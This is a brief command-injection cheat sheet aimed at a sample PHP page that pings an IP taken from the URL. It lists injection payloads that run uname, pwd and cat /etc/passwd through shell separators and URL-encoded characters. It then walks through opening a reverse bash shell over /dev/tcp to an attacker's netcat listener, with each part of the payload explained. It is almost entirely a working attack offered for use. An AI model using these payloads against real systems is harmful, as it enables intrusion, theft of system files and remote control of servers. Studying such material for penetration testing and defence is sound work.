Sample Site that uses ping and the IP provided in the URL
http://site.org/example.php?ip=127.0.0.1

	http://site.org/example.php?ip=127.0.0.1; uname -a
	http://site.org/example.php?ip=127.0.0.1 && uname -a
	http://site.org/example.php?ip=127.0.0.1%26%26cat /etc/passwd
		%26 is an &
	http://site.org/example.php?ip=127.0.0.1%0a pwd
		%0a is an encoded "new line"  Works great!
	Using netcat:
		nc site.org 80
			GET /example.php?ip=127.0.0.1|uname+-a HTTP/1.0


Use command injection to get a remote bash session
Attacker starts netcat listener
	nc -n -v -l -p 2222
Then in the user input form enter the following
	test; /bin/bash -i > /dev/tcp/<ip of nc>/2222 0<&1 2>&1; echo hello
		test;		data that the input form would normally use;
				i.e. username, password, etc
		/bin/bash -i	invoke bash in interactive mode
		> /dev/tcp	redirect output of bash to ip on port 2222 via
				/dev/tcp.  There is a / between ip and port
		0<&1		tells the system to duplicate the standard
				output file descriptor (&1) and connect it to
				the standard in of bash
		2>&1		standard error
		;echo hello	Just acting as a place holder in case the 1st
				two command don't actually work.  If you notice
				the 3rd command works but the other 2nd didn't
				you can compose your injection so the 3rd one
				will work...if necessary
